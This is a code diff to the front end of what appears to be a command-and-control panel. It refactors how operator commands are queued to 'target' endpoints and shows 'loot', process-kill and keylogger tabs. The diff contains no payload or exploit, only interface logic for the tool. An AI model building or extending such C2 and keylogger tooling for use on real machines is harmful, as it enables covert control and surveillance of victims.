@@ -81,17 +81,22 @@ function AppInner() {
 
   const [fileSubTab, setFileSubTab] = useState<'explorer' | 'loot'>('explorer');
 
-  const executeCommand = useCallback(async (cmd: string, silent: boolean = false) => {
-    if (!cmd.trim()) return;
-    const hasTarget = !!(selectedClientId && clients.some(c => c.id === selectedClientId)) || clients.length > 0;
-    if (!hasTarget && !silent) {
-      setTermLogs(prev => [...prev, `[-] No target online — command not queued: ${cmd}`]);
-      showToast('No endpoint online');
-      return;
-    }
+  const executeCommand = useCallback(async (cmd: string, silent: boolean = false): Promise<boolean> => {
+    if (!cmd.trim()) return false;
     const targetId = selectedClientId && clients.some(c => c.id === selectedClientId)
       ? selectedClientId
       : (clients[0]?.id || '');
+    // Guard: never queue to empty target - this was the "0 apps" race where auto-scan fired before clients loaded
+    if (!targetId) {
+      if (!silent) {
+        setTermLogs(prev => [...prev, `[-] No target online — command not queued: ${cmd}`]);
+        showToast('No endpoint online');
+      }
+      return false;
+    }
+    // Track loading state for Apps/Procs so UI shows spinner instead of "0 apps"
+    if (cmd === 'apps' || cmd.startsWith('apps ')) setIsAppsLoading(true);
+    if (cmd === 'ps' || cmd.startsWith('ps ')) setIsProcessesLoading(true);
     if (!silent) setTermLogs(prev => [...prev, `> ${cmd}`]);
     try {
       if (c2Mode === 'cloud' && c2ServerUrl) {
@@ -103,24 +108,39 @@ function AppInner() {
         });
         if (res.ok) {
           if (!silent) setTermLogs(prev => [...prev, `[+] Command queued via Cloud C2 for ${targetId}`]);
+          setTermInput('');
+          setSuggestions([]);
+          return true;
         } else {
           const body = await res.text().catch(() => '');
           const is429 = res.status === 429;
           const msg = is429 ? `Rate limited (429) — retry after ${res.headers.get('Retry-After') || '?'}s` : `Cloud C2 error ${res.status}: ${res.statusText} ${body.slice(0, 120)}`;
           if (!silent) setTermLogs(prev => [...prev, `[-] ${msg}`]);
           if (is429) showToast(msg);
+          if (cmd === 'apps') setIsAppsLoading(false);
+          if (cmd === 'ps') setIsProcessesLoading(false);
+          return false;
         }
       } else {
-        await invoke('send_command', { clientId: targetId, command: cmd });
+        const res: string = await invoke('send_command', { clientId: targetId, command: cmd });
+        if (res === 'ERR_NO_TARGET') {
+          if (!silent) showToast('No endpoint online');
+          if (cmd === 'apps') setIsAppsLoading(false);
+          if (cmd === 'ps') setIsProcessesLoading(false);
+          return false;
+        }
         if (!silent) setTermLogs(prev => [...prev, `[+] Command queued for ${targetId}`]);
-        // local mode: if no clients, warn was already handled above
+        setTermInput('');
+        setSuggestions([]);
+        return true;
       }
     } catch (err) {
       if (!silent) setTermLogs(prev => [...prev, `[-] Error sending command: ${err}`]);
+      if (cmd === 'apps') setIsAppsLoading(false);
+      if (cmd === 'ps') setIsProcessesLoading(false);
+      return false;
     }
-    setTermInput('');
-    setSuggestions([]);
-  }, [selectedClientId, clients, c2Mode, c2ServerUrl, authHeader]);
+  }, [selectedClientId, clients, c2Mode, c2ServerUrl, authHeader, showToast]);
 
   const {
     currentPath,
@@ -299,7 +319,7 @@ function AppInner() {
             <ProcessManager processList={processList} isProcessesLoading={isProcessesLoading} processSearch={processSearch} setProcessSearch={setProcessSearch} fetchProcesses={fetchProcesses} killProcess={killProcess} />
           )}
           {activeTab === 'apps' && (
-            <AppsExplorer appsList={appsList} isAppsLoading={isAppsLoading} appIcons={appIcons} executeCommand={executeCommand} />
+            <AppsExplorer appsList={appsList} isAppsLoading={isAppsLoading} appIcons={appIcons} executeCommand={executeCommand} hasTarget={!!(selectedClientId && clients.some(c => c.id === selectedClientId)) || clients.length > 0} onClearIcons={() => setAppIcons({})} />
           )}
           {activeTab === 'keylogger' && (
             <KeyLogger
